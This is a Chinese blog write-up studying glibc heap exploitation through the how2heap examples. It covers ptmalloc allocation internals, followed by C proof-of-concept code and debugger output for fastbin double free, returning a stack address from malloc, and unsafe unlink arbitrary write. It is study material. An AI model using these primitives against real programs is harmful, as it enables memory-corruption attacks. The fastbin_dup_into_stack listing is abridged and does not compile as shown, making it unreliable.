---
title: how2heap-分析总结
abbrlink: 41139
date: 2018-08-06 23:33:01
tags: pwn
password: how2heap
---

# 前言

how2heap有了很大的变化，特在此学习，记录。

# 内存分配概述 

摘自华庭大佬。

1. 分配算法概述，以 32 系统为例，64 位系统类似。

* 小于等于 64 字节：用 pool 算法分配。
*  64 到 512 字节之间：在最佳匹配算法分配和 pool 算法分配中取一种合适的。
* 大于等于 512 字节：用最佳匹配算法分配。
* 大于等于 mmap 分配阈值（默认值 128KB）：根据设置的 mmap 的分配策略进行分配，
  如果没有开启 mmap 分配阈值的动态调整机制，大于等于 128KB 就直接调用 mmap
  分配。否则，大于等于 mmap 分配阈值时才直接调用 mmap()分配。

2. ptmalloc 的响应用户内存分配要求的具体步骤为:
  * 获取分配区的锁，为了防止多个线程同时访问同一个分配区，在进行分配之前需要取得分配区域的锁。线程先查看线程私有实例中是否已经存在一个分配区，如果存在尝试对该分配区加锁，如果加锁成功，使用该分配区分配内存，否则，该线程搜索分配区循环链表试图获得一个空闲（没有加锁）的分配区。如果所有的分配区都已经加锁，那么 ptmalloc 会开辟一个新的分配区，把该分配区加入到全局分配区循环链表和线程的私有实例中并加锁，然后使用该分配区进行分配操作。开辟出来的新分配区一定为非主分配区，因为主分配区是从父进程那里继承来的。开辟非主分配区时会调用 mmap()创建一个 sub-heap，并设置好 top chunk。
  * 将用户的请求大小转换为实际需要分配的 chunk 空间大小。
  * 判断所需分配chunk的大小是否满足chunk_size <= max_fast (max_fast 默认为 64B)，如果是的话，则转下一步，否则跳到第 5 步。
  * 首先尝试在 fast bins 中取一个所需大小的 chunk 分配给用户。如果可以找到，则分配结束。否则转到下一步。
  * 判断所需大小是否处在 small bins 中，即判断 chunk_size < 512B 是否成立。如果chunk 大小处在 small bins 中，则转下一步，否则转到第 6 步。
  * 根据所需分配的 chunk 的大小，找到具体所在的某个 small bin，从该 bin 的尾部摘取一个恰好满足大小的 chunk。若成功，则分配结束，否则，转到下一步。
  * 到了这一步，说明需要分配的是一块大的内存，或者 small bins 中找不到合适的chunk。于是，ptmalloc 首先会遍历 fast bins 中的 chunk，将相邻的 chunk 进行合并，并链接到 unsorted bin 中，然后遍历 unsorted bin 中的 chunk，如果 unsorted bin 只有一个 chunk，并且这个 chunk 在上次分配时被使用过，并且所需分配的 chunk 大小属于 small bins，并且 chunk 的大小大于等于需要分配的大小，这种情况下就直接将该 chunk 进行切割，分配结束，否则将根据 chunk 的空间大小将其放入 smallbins 或是 large bins 中，遍历完成后，转入下一步。
  * 到了这一步，说明需要分配的是一块大的内存，或者 small bins 和 unsorted bin 中都找不到合适的 chunk，并且 fast bins 和 unsorted bin 中所有的 chunk 都清除干净了。从 large bins 中按照“smallest-first，best-fit”原则，找一个合适的 chunk，从中划分一块所需大小的 chunk，并将剩下的部分链接回到 bins 中。若操作成功，则分配结束，否则转到下一步。
  * 如果搜索 fast bins 和 bins 都没有找到合适的 chunk，那么就需要操作 top chunk 来进行分配了。判断 top chunk 大小是否满足所需 chunk 的大小，如果是，则从 topchunk 中分出一块来。否则转到下一步。
  * 到了这一步，说明 top chunk 也不能满足分配要求，所以，于是就有了两个选择: 如果是主分配区，调用 sbrk()，增加 top chunk 大小；如果是非主分配区，调用 mmap来分配一个新的 sub-heap，增加 top chunk 大小；或者使用 mmap()来直接分配。在这里，需要依靠 chunk 的大小来决定到底使用哪种方法。判断所需分配的 chunk大小是否大于等于 mmap 分配阈值，如果是的话，则转下一步，调用 mmap 分配，否则跳到第 12 步，增加 top chunk 的大小。
  * 使用 mmap 系统调用为程序的内存空间映射一块 chunk_size align 4kB 大小的空间。然后将内存指针返回给用户。
  * 判断是否为第一次调用 malloc，若是主分配区，则需要进行一次初始化工作，分配一块大小为(chunk_size + 128KB) align 4KB 大小的空间作为初始的 heap。若已经初始化过了，主分配区则调用 sbrk()增加 heap 空间，分主分配区则在 top chunk 中切割出一个 chunk，使之满足分配需求，并将内存指针返回给用户。

总结一下：根据用户请求分配的内存的大小，ptmalloc 有可能会在两个地方为用户分配内存空间。在第一次分配内存时，一般情况下只存在一个主分配区，但也有可能从父进程那里继承来了多个非主分配区，在这里主要讨论主分配区的情况，brk 值等于start_brk，所以实际上 heap 大小为 0，top chunk 大小也是 0。这时，如果不增加 heap大小，就不能满足任何分配要求。所以，若用户的请求的内存大小小于 mmap 分配阈值，则 ptmalloc 会初始 heap。然后在 heap 中分配空间给用户，以后的分配就基于这个 heap进行。若第一次用户的请求就大于 mmap 分配阈值，则 ptmalloc 直接使用 mmap()分配一块内存给用户，而 heap 也就没有被初始化，直到用户第一次请求小于 mmap 分配阈值的内存分配。第一次以后的分配就比较复杂了，简单说来，ptmalloc 首先会查找fast bins，如果不能找到匹配的 chunk，则查找 small bins。若还是不行，合并 fast bins，把 chunk加入 unsorted bin，在 unsorted bin 中查找，若还是不行，把 unsorted bin 中的 chunk 全加入 large bins 中，并查找 large bins。在 fast bins 和 small bins 中的查找都需要精确匹配，而在 large bins 中查找时，则遵循“smallest-first，best-fit”的原则，不需要精确匹配。若以上方法都失败了，则 ptmalloc 会考虑使用 top chunk。若 top chunk 也不能满足分配要求。而且所需 chunk 大小大于 mmap 分配阈值，则使用 mmap 进行分配。否则增加heap，增大 top chunk。以满足分配要求。

# 内存回收概述

free() 函数接受一个指向分配区域的指针作为参数，释放该指针所指向的 chunk。而具体的释放方法则看该 chunk 所处的位置和该 chunk 的大小。free()函数的工作步骤如下：

* free()函数同样首先需要获取分配区的锁，来保证线程安全。
* 判断传入的指针是否为 0，如果为 0，则什么都不做，直接 return。否则转下一步。
* 判断所需释放的 chunk 是否为 mmaped chunk，如果是，则调用 munmap()释放mmaped chunk，解除内存空间映射，该该空间不再有效。如果开启了 mmap 分配阈值的动态调整机制，并且当前回收的 chunk 大小大于 mmap 分配阈值，将 mmap分配阈值设置为该 chunk 的大小，将 mmap 收缩阈值设定为 mmap 分配阈值的 2倍，释放完成，否则跳到下一步。
* 判断 chunk 的大小和所处的位置，若 chunk_size <= max_fast，并且 chunk 并不位于heap 的顶部，也就是说并不与 top chunk 相邻，则转到下一步，否则跳到第 6 步。（因为与 top chunk 相邻的小 chunk 也和 top chunk 进行合并，所以这里不仅需要判断大小，还需要判断相邻情况）
* 将 chunk 放到 fast bins 中，chunk 放入到 fast bins 中时，并不修改该 chunk 使用状态位 P。也不与相邻的 chunk 进行合并。只是放进去，如此而已。这一步做完之后释放便结束了，程序从 free()函数中返回。
* 判断前一个 chunk 是否处在使用中，如果前一个块也是空闲块，则合并。并转下一步。
* 判断当前释放 chunk 的下一个块是否为 top chunk，如果是，则转第 9 步，否则转下一步。
* 判断下一个 chunk 是否处在使用中，如果下一个 chunk 也是空闲的，则合并，并将合并后的 chunk 放到 unsorted bin 中。注意，这里在合并的过程中，要更新 chunk的大小，以反映合并后的 chunk 的大小。并转到第 10 步。
* 如果执行到这一步，说明释放了一个与 top chunk 相邻的 chunk。则无论它有多大，都将它与 top chunk 合并，并更新 top chunk 的大小等信息。转下一步。
* 判断合并后的 chunk 的大小是否大于 FASTBIN_CONSOLIDATION_THRESHOLD（默认64KB），如果是的话，则会触发进行 fast bins 的合并操作，fast bins 中的 chunk 将被遍历，并与相邻的空闲 chunk 进行合并，合并后的 hunk 会被放到 unsorted bin 中。fast bins 将变为空，操作完成之后转下一步。
* 判断 top chunk 的大小是否大于 mmap 收缩阈值（默认为 128KB），如果是的话，对于主分配区，则会试图归还 top chunk 中的一部分给操作系统。但是最先分配的128KB 空间是不会归还的，ptmalloc 会一直管理这部分内存，用于响应用户的分配请求；如果为非主分配区，会进行 sub-heap 收缩，将 top chunk 的一部分返回给操作系统，如果 top chunk 为整个 sub-heap，会把整个 sub-heap 还回给操作系统。做完这一步之后，释放结束，从 free() 函数退出。可以看出，收缩堆的条件是当前free 的 chunk 大小加上前后能合并 chunk 的大小大于 64k，并且要 top chunk 的大小要达到 mmap 收缩阈值，才有可能收缩堆。

# first_fit

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main()
{
	fprintf(stderr, "This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n");
	fprintf(stderr, "glibc uses a first-fit algorithm to select a free chunk.\n");
	fprintf(stderr, "If a chunk is free and large enough, malloc will select this chunk.\n");
	fprintf(stderr, "This can be exploited in a use-after-free situation.\n");

	fprintf(stderr, "Allocating 2 buffers. They can be large, don't have to be fastbin.\n");
	char* a = malloc(512);
	char* b = malloc(256);
	char* c;

	fprintf(stderr, "1st malloc(512): %p\n", a);
	fprintf(stderr, "2nd malloc(256): %p\n", b);
	fprintf(stderr, "we could continue mallocing here...\n");
	fprintf(stderr, "now let's put a string at a that we can read later \"this is A!\"\n");
	strcpy(a, "this is A!");
	fprintf(stderr, "first allocation %p points to %s\n", a, a);

	fprintf(stderr, "Freeing the first one...\n");
	free(a);

	fprintf(stderr, "We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\n", a);

	fprintf(stderr, "So, let's allocate 500 bytes\n");
	c = malloc(500);
	fprintf(stderr, "3rd malloc(500): %p\n", c);
	fprintf(stderr, "And put a different string here, \"this is C!\"\n");
	strcpy(c, "this is C!");
	fprintf(stderr, "3rd allocation %p points to %s\n", c, c);
	fprintf(stderr, "first allocation %p points to %s\n", a, a);
	fprintf(stderr, "If we reuse the first allocation, it now holds the data from the third allocation.");
}
```

* 分配两个块，a块512B, b块256B，并在a块中写入"This is A!"
* 释放a块，a块将会被放到unsorted bin中

```shell
   22 	fprintf(stderr, "first allocation %p points to %s\n", a, a);
   23 
   24 	fprintf(stderr, "Freeing the first one...\n");
   25 	free(a);
   26 
 ► 27 	fprintf(stderr, "We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\n", a);
   28 
   29 	fprintf(stderr, "So, let's allocate 500 bytes\n");
   30 	c = malloc(500);
   31 	fprintf(stderr, "3rd malloc(500): %p\n", c);
   32 	fprintf(stderr, "And put a different string here, \"this is C!\"\n");
─────────────────────────────────────[ STACK ]─────────────────────────────────────
00:0000│ rsp  0x7fffffffdd60 —▸ 0x4008f0 (__libc_csu_init) ◂— push   r15
01:0008│      0x7fffffffdd68 —▸ 0x603010 —▸ 0x7ffff7dd1b78 (main_arena+88) —▸ 0x603320 ◂— 0x0
02:0010│      0x7fffffffdd70 —▸ 0x603220 ◂— 0x0
03:0018│      0x7fffffffdd78 ◂— 0x0
04:0020│ rbp  0x7fffffffdd80 —▸ 0x4008f0 (__libc_csu_init) ◂— push   r15
05:0028│      0x7fffffffdd88 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
06:0030│      0x7fffffffdd90 ◂— 0x0
07:0038│      0x7fffffffdd98 —▸ 0x7fffffffde68 —▸ 0x7fffffffe208 ◂— 0x69712f656d6f682f ('/home/qi')
───────────────────────────────────[ BACKTRACE ]───────────────────────────────────
 ► f 0           4007dc main+406
   f 1     7ffff7a2d830 __libc_start_main+240
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x7ffff7dd1b78 (main_arena+88) —▸ 0x603000 ◂— 0x7ffff7dd1b78
smallbins
empty
largebins
empty
```

* 分配c块，500B

注意:

* Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，**即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取**。
* 在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。

当程序再一次 malloc 一个大小与我们 free 掉的chunk 大小差不多的 chunk ，系统会优先从 bins 里找到一个合适的 chunk 把他取出来再使用。写入'this is C'

```
   26 
   27 	fprintf(stderr, "We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\n", a);
   28 
   29 	fprintf(stderr, "So, let's allocate 500 bytes\n");
   30 	c = malloc(500);
 ► 31 	fprintf(stderr, "3rd malloc(500): %p\n", c);
   32 	fprintf(stderr, "And put a different string here, \"this is C!\"\n");
   33 	strcpy(c, "this is C!");
   34 	fprintf(stderr, "3rd allocation %p points to %s\n", c, c);
   35 	fprintf(stderr, "first allocation %p points to %s\n", a, a);
   36 	fprintf(stderr, "If we reuse the first allocation, it now holds the data from the third allocation.");
pwndbg> heap
0x603000 PREV_INUSE {
  prev_size = 0, 
  size = 529, 
  fd = 0x7ffff7dd1d78 <main_arena+600>, 
  bk = 0x7ffff7dd1d78 <main_arena+600>, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603210 PREV_INUSE {
  prev_size = 528, 
  size = 273, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603320 PREV_INUSE {
  prev_size = 0, 
  size = 134369, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
```

* 此时，a指针和c指针指向同一个地址

# fastbin_dup

```
#include <stdio.h>
#include <stdlib.h>

int main()
{
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	free(a);
	free(b);
	free(a);

	fprintf(stderr, "1st malloc(8): %p\n", malloc(8));
	fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
	fprintf(stderr, "3rd malloc(8): %p\n", malloc(8));
}
```

结果：

```
This file demonstrates a simple double-free attack with fastbins.
Allocating 3 buffers.
1st malloc(8): 0x207e010
2nd malloc(8): 0x207e030
3rd malloc(8): 0x207e050
Freeing the first one...
If we free 0x207e010 again, things will crash because 0x207e010 is at the top of the free list.
So, instead, we'll free 0x207e030.
Now, we can free 0x207e010 again, since it's not the head of the free list.
Now the free list has [ 0x207e010, 0x207e030, 0x207e010 ]. If we malloc 3 times, we'll get 0x207e010 twice!
1st malloc(8): 0x207e010
2nd malloc(8): 0x207e030
3rd malloc(8): 0x207e010
```

* 分配3个块，a,b,c
* 释放区块a
* 这时候如果再次释放区块a,那么程序将会崩溃，因为a在空闲列表的顶端，所以释放区块b
* 第二次释放区块a
* 这时候，空闲列表中有3个区块，a -> b -> a

```c
0x602000 FASTBIN {
  prev_size = 0, 
  size = 33, 
  fd = 0x602020, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x21
}
0x602020 FASTBIN {
  prev_size = 0, 
  size = 33, 
  fd = 0x602000, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x21
}
0x602040 FASTBIN {
  prev_size = 0, 
  size = 33, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x20fa1
}
0x602060 PREV_INUSE {
  prev_size = 0, 
  size = 135073, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> bins
fastbins
0x20: 0x602000 —▸ 0x602020 ◂— 0x602000
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

* 再次申请3个区块d,e,f，其中d和f将指向同一个地址

这样，可以绕过fastbins的double free检查。

# fastbin_dup_into_stack

```
#include <stdio.h>
#include <stdlib.h>

int main()
{
	unsigned long long stack_var;

	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	free(a);
	free(b);
	free(a);

	stack_var = 0x20;
	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

	fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
	fprintf(stderr, "4th malloc(8): %p\n", malloc(8));
}
```

结果如下:

```
This file extends on fastbin_dup.c by tricking malloc into
returning a pointer to a controlled location (in this case, the stack).
The address we want malloc() to return is 0x7ffcebcdf618.
Allocating 3 buffers.
1st malloc(8): 0xafe010
2nd malloc(8): 0xafe030
3rd malloc(8): 0xafe050
Freeing the first one...
If we free 0xafe010 again, things will crash because 0xafe010 is at the top of the free list.
So, instead, we'll free 0xafe030.
Now, we can free 0xafe010 again, since it's not the head of the free list.
Now the free list has [ 0xafe010, 0xafe030, 0xafe010 ]. We'll now carry out our attack by modifying data at 0xafe010.
1st malloc(8): 0xafe010
2nd malloc(8): 0xafe030
Now the free list has [ 0xafe010 ].
Now, we have access to 0xafe010 while it remains at the head of the free list.
so now we are writing a fake free size (in this case, 0x20) to the stack,
so that malloc will think there is a free chunk there and agree to
return a pointer to it.
Now, we overwrite the first 8 bytes of the data at 0xafe010 to point right before the 0x20.
3rd malloc(8): 0xafe010, putting the stack address on the free list
4th malloc(8): 0x7ffcebcdf618
```

* 申请3个块，a,b,c
* 释放a
* 释放b
* 再次释放a
* 这时候，空闲列表  a -> b -> a

```
pwndbg> bins
fastbins
0x20: 0x603000 —▸ 0x603020 ◂— 0x603000
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> p &stack_var
$4 = (unsigned long long *) 0x7fffffffdd10
```

* 再次申请2个区块d,e, 这时候，空闲列表头部将变为 a

```
pwndbg> bin
fastbins
0x20: 0x603000 —▸ 0x603020 ◂— 0x603000
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty

```

* 修改stack_var的值为0x20
* 修改*\*d*的值为`&stack_var - sizeof(d) = 0x7fffffffdd08`。

```
pwndbg> x/x 0x603000
0x603000:	0x0000000000000000
pwndbg> x/4xg 0x603000
0x603000:	0x0000000000000000	0x0000000000000021
0x603010:	0x00007fffffffdd08	0x0000000000000000
```

* 这时候，空闲列表变为`a -> 0x7fffffffdd08 -> .....`

```
pwndbg> bin
fastbins
0x20: 0x603000 —▸ 0x7fffffffdd08 —▸ 0x603010 ◂— 0x0
```

* 申请一个区块

```
pwndbg> bin
fastbins
0x20: 0x7fffffffdd08 —▸ 0x603010 ◂— 0x0
```

* 再次申请一个区块，该区块地址就是`0x7fffffffdd08`

总结: 漏洞利用uaf

# fastbin_dup_consolidate

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

int main() {
  void* p1 = malloc(0x40);
  void* p2 = malloc(0x40);
  fprintf(stderr, "Allocated two fastbins: p1=%p p2=%p\n", p1, p2);
  fprintf(stderr, "Now free p1!\n");
  free(p1);

  void* p3 = malloc(0x400);
  fprintf(stderr, "Allocated large bin to trigger malloc_consolidate(): p3=%p\n", p3);
  fprintf(stderr, "In malloc_consolidate(), p1 is moved to the unsorted bin.\n");
  free(p1);
  fprintf(stderr, "Trigger the double free vulnerability!\n");
  fprintf(stderr, "We can pass the check in malloc() since p1 is not fast top.\n");
  fprintf(stderr, "Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n", malloc(0x40), malloc(0x40));
}
```

结果如下:

```
Allocated two fastbins: p1=0xee0010 p2=0xee0060
Now free p1!
Allocated large bin to trigger malloc_consolidate(): p3=0xee00b0
In malloc_consolidate(), p1 is moved to the unsorted bin.
Trigger the double free vulnerability!
We can pass the check in malloc() since p1 is not fast top.
Now p1 is in unsorted bin and fast bin. So we'will get it twice: 0xee0010 0xee0010
```

* 首先分配两个p1,p2，大小均为0x40
* 释放p1
* 申请一个0x400大小的区块p3，由于p3是large chunk，所以会触发`malloc_consolidate`操作

```
/*
     If this is a large request, consolidate fastbins before continuing.
     While it might look excessive to kill all fastbins before
     even seeing if there is space available, this avoids
     fragmentation problems normally associated with fastbins.
     Also, in practice, programs tend to have runs of either small or
     large requests, but less often mixtures, so consolidation is not
     invoked all that often in most programs. And the programs that
     it is called frequently in otherwise tend to fragment.
   */

  else
    {
      idx = largebin_index (nb);
      if (have_fastchunks (av))
        malloc_consolidate (av);
    }
```

当分配 large chunk 时，首先根据 chunk 的大小获得对应的 large bin 的 index，接着判断当前分配区的 fast bins 中是否包含 chunk，如果有，调用 `malloc_consolidate() `函数合并 fast bins 中的 chunk，并将这些空闲 chunk 加入 unsorted bin 中。因为这里分配的是一个 large chunk，所以 unsorted bin 中的 chunk 按照大小被放回 small bins 或 large bins 中。这个时候,p1就被放到small bins中,就可以再次释放 p1

```
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0x50: 0x7ffff7dd1bb8 (main_arena+152) —▸ 0x602000 ◂— 0x7ffff7dd1bb8
largebins
empty
```

* 释放p1, 这时候，small bins和fast bins都包含p1
* 连续申请两个0x40大小的块，将指向同一个地址

# unsafe_unlink

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


uint64_t *chunk0_ptr;

int main()
{
	fprintf(stderr, "Welcome to unsafe unlink 2.0!\n");
	fprintf(stderr, "Tested in Ubuntu 14.04/16.04 64bit.\n");
	fprintf(stderr, "This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
	fprintf(stderr, "The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");

	int malloc_size = 0x80; //we want to be big enough not to use fastbins
	int header_size = 2;

	fprintf(stderr, "The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");

	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
	fprintf(stderr, "The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
	fprintf(stderr, "The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);

	fprintf(stderr, "We create a fake chunk inside chunk0.\n");
	fprintf(stderr, "We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
	fprintf(stderr, "We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
	fprintf(stderr, "With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
	fprintf(stderr, "Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
	fprintf(stderr, "Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);

	fprintf(stderr, "We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
	fprintf(stderr, "We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
	fprintf(stderr, "It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
	chunk1_hdr[0] = malloc_size;
	fprintf(stderr, "If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
	fprintf(stderr, "We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
	chunk1_hdr[1] &= ~1;

	fprintf(stderr, "Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
	fprintf(stderr, "You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n");
	free(chunk1_ptr);

	fprintf(stderr, "At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
	char victim_string[8];
	strcpy(victim_string,"Hello!~");
	chunk0_ptr[3] = (uint64_t) victim_string;

	fprintf(stderr, "chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
	fprintf(stderr, "Original value: %s\n",victim_string);
	chunk0_ptr[0] = 0x4141414142424242LL;
	fprintf(stderr, "New Value: %s\n",victim_string);
}
```

结果如下:

```
Welcome to unsafe unlink 2.0!
Tested in Ubuntu 14.04/16.04 64bit.
This technique can be used when you have a pointer at a known location to a region you can call unlink on.
The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.
The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.

The global chunk0_ptr is at 0x602070, pointing to 0x1d0b010
The victim chunk we are going to corrupt is at 0x1d0b0a0

We create a fake chunk inside chunk0.
We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.
We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.
With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False
Fake chunk fd: 0x602058
Fake chunk bk: 0x602060

We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.
We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.
It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly
If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80
We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.

Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.
You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344

At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.
chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.
Original value: Hello!~
New Value: BBBBAAAA
```

**目的: 通过堆溢出，在释放堆块（不包括fastbin）时，调用unlink方法，实现任意地址写。**

* 全局变量chunk0_ptr，申请0x80大小的chunk，地址保存在chunk0_ptr中
* 局部变量chunk1_ptr，申请0x80大小的chunk，地址保存在chunk1_ptr中

```
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of previous chunk, if allocated            | |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |          Size of chunk          |MAIN_ARENA|IS MMAP|PREV INUSE|
      chunk0_ptr-> -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             User data starts here...                          .
        .                                                               .
        .             (malloc_usable_size() bytes)                      .
        .                                                               |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of previous chunk                            |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of chunk, in bytes                     | | |P|
      chunk1_ptr->-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Forward pointer to next chunk in list             |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Back pointer to previous chunk in list            |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Unused space (may be 0 bytes long)                .
        .                                                               .
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

* 为了绕过`P->fd->bk!=P || P->bk->fd!=P`，在chunk0中伪造新的区块

```
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of previous chunk, if allocated            | |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of chunk, in bytes                     | |M|P|
      chunk0_ptr-> -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |                      fake prev size 0x0 	    	     		|
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        
        |                      fake size 0x0                         |P |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+               
        .            fake fd: &chunk0_ptr - 24                          .
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 
        .            fake bk: &chunk0_ptr - 16                          .
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        .            unuse space                                        .
        .                                                               .
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of previous chunk                            |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of chunk, in bytes                     | | |P|
      chunk1_ptr->-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
        |             0x0                                               |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             0x0                                                
